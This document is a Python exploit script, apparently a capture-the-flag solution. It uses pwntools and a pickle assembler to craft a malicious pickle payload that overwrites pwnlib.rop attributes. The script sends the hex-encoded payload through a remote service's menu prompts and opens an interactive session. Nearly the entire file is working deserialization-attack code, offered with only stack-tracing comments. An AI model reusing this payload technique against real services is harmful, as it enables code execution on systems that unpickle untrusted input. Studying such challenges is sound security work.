from pwnlib.rop import rop
from pickleassem import PickleAssembler
from pwn import *

host = args.HOST or "127.0.0.1"
port = int(args.PORT or 1337)


pa = PickleAssembler(proto=4)

# rop.repr = super_exploit
pa.push_short_binunicode("pwnlib.rop")
pa.push_short_binunicode("rop")
pa.build_stack_global()
# stack:
#   pwnlib.rop.rop

pa.push_mark()
# stack:
#   pwnlib.rop.rop
#   mark

pa.push_none()
# stack:
#   pwnlib.rop.rop
#   mark
#   None

pa.push_empty_dict()
# stack:
#   pwnlib.rop.rop
#   mark
#   None
#   dict()

pa.push_binstring("repr")
# stack:
#   pwnlib.rop.rop
#   mark
#   None
#   dict()
#   'repr'

pa.push_short_binunicode("pwnlib.rop.rop")
pa.push_short_binunicode("super_exploit")
# stack:
#   pwnlib.rop.rop
#   mark
#   None
#   dict()
#   'repr'
#   'pwnlib.rop.rop'
#   'super_exploit'

pa.build_stack_global()
# stack:
#   ROP
#   mark
#   None
#   dict()
#   'repr'
#   pwnlib.rop.rop.super_exploit

pa.build_setitem()
# stack:
#   ROP
#   mark
#   None
#   __dict__['repr'] = pwnlib.rop.rop.super_exploit

pa.build_tuple()
# stack:
#   ROP
#   (None, __dict__['repr'] = rop.super_exploit)

pa.build_build()
pa.pop()

# rop.bad_hacker = rop.ROP.clear_cache
pa.push_short_binunicode("pwnlib.rop")
pa.push_short_binunicode("rop")
pa.build_stack_global()
pa.push_mark()
pa.push_none()
pa.push_empty_dict()
pa.push_binstring("bad_hacker")
pa.push_short_binunicode("pwnlib.rop.rop.ROP")
pa.push_short_binunicode("clear_cache")
pa.build_stack_global()
pa.build_setitem()
pa.build_tuple()
pa.build_build()
pa.pop()

# rop.ROP.chain = rop.ROP.regs
pa.push_short_binunicode("pwnlib.rop.rop")
pa.push_short_binunicode("ROP")
pa.build_stack_global()
pa.push_mark()
pa.push_none()
pa.push_empty_dict()
pa.push_binstring("chain")
pa.push_short_binunicode("pwnlib.rop.rop.ROP")
pa.push_short_binunicode("regs")
pa.build_stack_global()
pa.build_setitem()
pa.build_tuple()
pa.build_build()
pa.pop()

pa.push_short_binunicode("pwnlib.rop.rop")
pa.push_short_binunicode("ROP")
pa.build_stack_global()

payload = pa.assemble()

r = remote(host, port)
r.sendlineafter(b":", "1")
r.sendlineafter(b":", str(payload.hex()))
r.sendlineafter(b":", "2")
r.sendlineafter(b":", "3")
r.sendlineafter(b":", "3")
r.interactive()
